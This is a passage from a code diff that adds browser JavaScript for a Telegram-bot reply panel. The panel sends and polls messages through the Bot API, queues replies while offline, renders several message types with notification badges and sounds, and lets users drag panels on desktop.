+            renderReplyMsg({
+                message_id: res.result?.message_id || Date.now(),
+                chat: { id: TELEGRAM_CHAT_ID },
+                from: { first_name: 'YOU' },
+                date: Math.floor(Date.now() / 1000),
+                text,
+                _own: true
+            });
+            input.value = '';
+            playSound(700, 0.1, 'sine');
+        } else {
+            showPopup(`REPLY_FAILED: ${res.description || 'UNKNOWN'}`, true);
+        }
+    } catch (err) {
+        if (!navigator.onLine) {
+            queuePush({ kind: 'text', text });
+            showPopup('📥 REPLY_QUEUED', false);
+            input.value = '';
+        } else {
+            showPopup(`REPLY_ERROR: ${err.message}`, true);
+        }
+    } finally {
+        if (btn) btn.disabled = false;
+    }
+}
+
+function initReplyViewer() {
+    // Get the latest update_id first (so we don't replay old history)
+    bootstrapUpdateId().then(() => {
+        // Poll every 10 seconds
+        replyPolling = every(pollReplies, 10000);
+    });
+}
+
+async function bootstrapUpdateId() {
+    try {
+        const res = await tgCall('getUpdates', { limit: 1, offset: -1 }, null, null);
+        if (res.ok && res.result && res.result.length) {
+            lastUpdateId = res.result[res.result.length - 1].update_id + 1;
+        }
+    } catch (_) {}
+}
+
+async function pollReplies() {
+    if (isSending) return;   // don't race with an active upload
+
+    try {
+        const res = await tgCall('getUpdates', {
+            offset: lastUpdateId,
+            limit: 20,
+            allowed_updates: JSON.stringify(['message', 'channel_post'])
+        }, null, null);
+
+        if (!res || !res.ok || !res.result || !res.result.length) return;
+
+        res.result.forEach(update => {
+            if (update.update_id >= lastUpdateId) lastUpdateId = update.update_id + 1;
+            const msg = update.message || update.channel_post || update.edited_message;
+            if (!msg) return;
+            if (String(msg.chat.id) !== String(TELEGRAM_CHAT_ID)) return;
+            renderReplyMsg(msg);
+        });
+    } catch (_) {}
+}
+
+function renderReplyMsg(msg) {
+    const list = document.getElementById('replyList');
+    const empty = document.getElementById('replyEmpty');
+    if (!list) return;
+
+    // Hide the "awaiting" placeholder
+    if (empty) empty.style.display = 'none';
+
+    const div = document.createElement('div');
+    div.className = 'reply-msg' + (msg._own ? ' own' : '');
+
+    // Sender
+    const from = msg.from || msg.sender_chat || {};
+    const senderName = from.username
+        ? `@${from.username}`
+        : [from.first_name, from.last_name].filter(Boolean).join(' ')
+        || from.title || 'UNKNOWN';
+
+    const senderEl = document.createElement('div');
+    senderEl.className = 'reply-sender';
+    senderEl.textContent = `[${senderName}]`;
+    div.appendChild(senderEl);
+
+    // Content
+    const contentEl = document.createElement('div');
+    if (msg.text) {
+        contentEl.className = 'reply-text';
+        contentEl.textContent = msg.text;
+    } else if (msg.photo) {
+        contentEl.className = 'reply-media';
+        contentEl.textContent = '📷 [PHOTO]' + (msg.caption ? ` — ${msg.caption}` : '');
+    } else if (msg.document) {
+        contentEl.className = 'reply-media';
+        contentEl.textContent = `📎 [FILE: ${msg.document.file_name || 'document'}]`;
+    } else if (msg.voice) {
+        contentEl.className = 'reply-media';
+        contentEl.textContent = `🎤 [VOICE: ${msg.voice.duration}s]`;
+    } else if (msg.video) {
+        contentEl.className = 'reply-media';
+        contentEl.textContent = `🎥 [VIDEO: ${msg.video.duration}s]`;
+    } else if (msg.sticker) {
+        contentEl.className = 'reply-media';
+        contentEl.textContent = `🎴 [STICKER: ${msg.sticker.emoji || ''}]`;
+    } else if (msg.location) {
+        contentEl.className = 'reply-media';
+        contentEl.textContent = `📍 [LOCATION: ${msg.location.latitude}, ${msg.location.longitude}]`;
+    } else {
+        contentEl.className = 'reply-media';
+        contentEl.textContent = '[UNSUPPORTED_MESSAGE_TYPE]';
+    }
+    div.appendChild(contentEl);
+
+    // Time
+    const timeEl = document.createElement('div');
+    timeEl.className = 'reply-time';
+    const d = new Date(msg.date * 1000);
+    timeEl.textContent = d.toLocaleTimeString();
+    div.appendChild(timeEl);
+
+    // Prepend newest at top
+    list.insertBefore(div, list.firstChild);
+
+    // Badge + notification
+    replyCount++;
+    const badge = document.getElementById('replyBadge');
+    if (badge) { badge.style.display = 'inline'; badge.textContent = replyCount; }
+
+    // Sound
+    playSound(520, 0.15, 'sine');
+
+    // Keep max 50 messages in the panel
+    const msgs = list.querySelectorAll('.reply-msg');
+    if (msgs.length > 50) msgs[msgs.length - 1].remove();
+}
+
+// Clear badge when user scrolls into reply panel
+document.addEventListener('DOMContentLoaded', () => {
+    const obs = new IntersectionObserver(entries => {
+        if (entries[0].isIntersecting) {
+            replyCount = 0;
+            const badge = document.getElementById('replyBadge');
+            if (badge) badge.style.display = 'none';
+        }
+    }, { threshold: 0.5 });
+    const panel = document.getElementById('replyStream');
+    if (panel) obs.observe(panel);
+});
+
+// ===== 15. PANEL DRAGGING (desktop only) =====
+function setupPanelDragging() {
+    let isDragging = false;
+    let currentPanel = null;
+    let offsetX = 0, offsetY = 0;
+
+    document.querySelectorAll(PANEL_SELECTOR).forEach(panel => {
+        const header = panel.querySelector('.panel-header, .window-header, .stream-header, .history-header');
+        if (!header) return;
+
+        header.addEventListener('mousedown', (e) => {
+            if (isMobile() || e.target.classList.contains('panel-close')) return;
+
+            isDragging = true;
+            currentPanel = panel;
+
+            const rect = panel.getBoundingClientRect();
+            offsetX = e.clientX - rect.left;
+            offsetY = e.clientY - rect.top;
+
+            panel.style.zIndex = 100;
+            document.body.style.userSelect = 'none';
+        });
+    });
+
+    document.addEventListener('mousemove', (e) => {
+        if (!isDragging || !currentPanel) return;
+
+        currentPanel.style.position = 'fixed';
+        currentPanel.style.left = (e.clientX - offsetX) + 'px';
+        currentPanel.style.top = (e.clientY - offsetY) + 'px';
+
+        // Keep within bounds
+        const rect = currentPanel.getBoundingClientRect();
+        if (rect.left < 0) currentPanel.style.left = '0px';
+        if (rect.top < 0) currentPanel.style.top = '0px';
+        if (rect.right > window.innerWidth) currentPanel.style.left = (window.innerWidth - rect.width) + 'px';
+        if (rect.bottom > window.innerHeight) currentPanel.style.top = (window.innerHeight - rect.height) + 'px';
+    });
+
+    document.addEventListener('mouseup', () => {
+        isDragging = false;
+        if (currentPanel) {
+            currentPanel.style.zIndex = 50;
+            currentPanel = null;
+        }
+        document.body.style.userSelect = '';
+    });
+}
+
+    </script>
+</body>
+</html>
